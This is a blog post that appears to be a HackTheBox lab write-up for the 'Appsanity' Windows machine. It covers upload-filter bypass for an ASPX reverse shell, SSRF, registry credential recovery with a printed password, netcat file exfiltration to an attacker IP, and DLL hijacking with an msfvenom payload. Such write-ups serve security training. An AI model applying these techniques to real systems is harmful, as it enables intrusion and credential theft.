---
layout: post
title: "Appsanity-Wiwdows-Hard"
date:   2025-07-10 12:05:57 -0400
categories: writeups
thumb: /assets/images/logos/3637f8cd2b3850f40cb6d16b7c39d43b.webp
---

# Appsanity

HackTheBox: Hard

<aside>
ðŸ’¡ A hard windows machine where we can explore a web site looking for SSFR vulneravility.

</aside>

## 1: Enumeration
<br/><br/>
nmap scanning
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled.png' | relative_url }})
<br/><br/>
Thereâ€™s just two ports opened let's see whatâ€™s going on 
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_1.png' | relative_url }})
<br/><br/>
A healthcare page with a sign in interface, try sign up a use brupsuite
<br/><br/>
There are some parameters we pass away when we sign up, one of those is Acctype which is normally 1 but thereâ€™s no sanitization and we can change it to number 2 and create a doctor account.
Using burpsuite we catch the access_token which could help us later
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_2.png' | relative_url }})
<br/><br/>
Using ffuf tool to reach subdomains i found a portal one, we add it at etc/hosts and letâ€™s check
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_3.png' | relative_url }})
<br/><br/>
A login interface, we donâ€™t have those creds, but may trying using the token weâ€™ve got before can be useful
<br/><br/>
## 2: User flag
<br/><br/>
- Once inside go to Upload report where we can send .pdf reports, the system (function upload) check the extension and the header of the file.
<br/><br/>
 Additionally we use burpsuite to  see existing reports and found a ViewReports.aspx file used to read reports. So weâ€™re gonna use a revshell.aspx to induce later a SSFR on Issue Prescription where there is a panel which enable make requests to the [localhost](http://localhost) on 8080 port.
 
<br/><br/>
1. Our rev shell must have %PDF-1.3 on the first line to assure the program will recognize as a pdf.
<br/><br/>
2. Our rev shell must have a .pdf extension.
<br/><br/>
3. Send the payload and active the proxy to fix parameters using burpsuite
<br/><br/>
4. Change the extension of the file from pdf to aspx â†’ forwardâ†’ forward â†’ forward
<br/><br/>
Then we should get a success message and go yo IssuePrescription panel
<br/><br/>
> Open a listening port using netcat
> 
<br/><br/>
Exploit SSFR 
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_4.png' | relative_url }})
<br/><br/>
User flag on c:\Users\svc_exampanel\Desktop>type user.txt
<br/><br/>
## 3: Priv esc
<br/><br/>
- We found some dllâ€™s on c:\inetpub\ExaminationPanel\ExaminationPanel\bin
<br/><br/>
- Thereâ€™s might be something interesting on ExaminationManagement.dll letâ€™s move from here to c:\Users\svc_exampanel\Desktop because is there where we have permissions, use nc to download locally to reverse it.
<br/><br/>
```bash
nc -lnvp4444 >  ExaminationManagement.dll
.\nc.exe 10.10.14.000 4444 -w 3 <  ExaminationManagement.dll
```

<br/><br/>
<aside>
ðŸª¡ Weâ€™ll use dnSpy to reverse dll

</aside>
<br/><br/>
We can see thereâ€™s a key which is saved on the local machine specifically on (Software\\MedDigi)  
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_5.png' | relative_url }})
<br/><br/>
```bash
reg query HKEY_LOCAL_MACHINE\Software\MedDigi
```
<br/><br/>
- "HKEY_LOCAL_MACHINE" is one of the five main sections of the Windows registry. It contains settings specific to the current computer, regardless of the user logged in.
<br/><br/>
- "Software" is a subsection within HKEY_LOCAL_MACHINE that contains information about installed software on the system.
<br/><br/>
- "MedDigi" appears to be a specific key within the "Software" subsection.
<br/><br/>
### Password: 1g0tTh3R3m3dy\!\!
<br/><br/>
\ To indicate a special character
<br/><br/>
Check for evil winrm port (5985) to see if we can get access
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_6.png' | relative_url }})
<br/><br/>
We have these users
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_7.png' | relative_url }})
<br/><br/>
So
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_8.png' | relative_url }})
<br/><br/>
Download linpeas and see whatâ€™s going on
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_9.png' | relative_url }})
<br/><br/>
Thereâ€™s a service running locally
<br/><br/>
Revese ReportManagement.exe and check  using search â€˜uploadâ€™  and f5 to decompile
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_10.png' | relative_url }})
<br/><br/>
We found what is the dllâ€™s route and a dll called externalupload which we can not find on existing dllâ€™s, it is call from somewhere
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_11.png' | relative_url }})
<br/><br/>
icacls to check premises and we have write permissions, so we can make a beautiful dll hijacking
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_12.png' | relative_url }})

<br/><br/>
Once we finalize recognition letâ€™s exploit the vulnerability and  escalate privileges

We are gonna make the evil dll using msfvenom tool, we use -p to specify payload type(Meterpeter). Our local host will be a network interface (tun0) which will receive the reverse connection -f says the outgoing format
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_13.png' | relative_url }})
<br/><br/>
We are going to listen using metasploit. We use this tool because it help us to get connections from multiple kinds of payloads made by using MSFVenom with multi/handler
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_14.png' | relative_url }})
<br/><br/>
Upload the dll
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_15.png' | relative_url }})
<br/><br/>
Start a port forwarding to execute commands in a service running locally
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_16.png' | relative_url }})
<br/><br/>
Establishing port forwarding.
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_17.png' | relative_url }})
<br/><br/>
Use net cat to run the service and upload our malicious dll
<br/><br/>
![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_18.png' | relative_url }})
<br/><br/>
Machine pwned!!

![Untitled]({{ '/assets/images/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570/94ca916f-5bc2-4a9a-af6f-814258e195ad-export-f51654bc-029e-4954-975d-4dc867d57570_Untitled_19.png' | relative_url }})

<script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>


<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
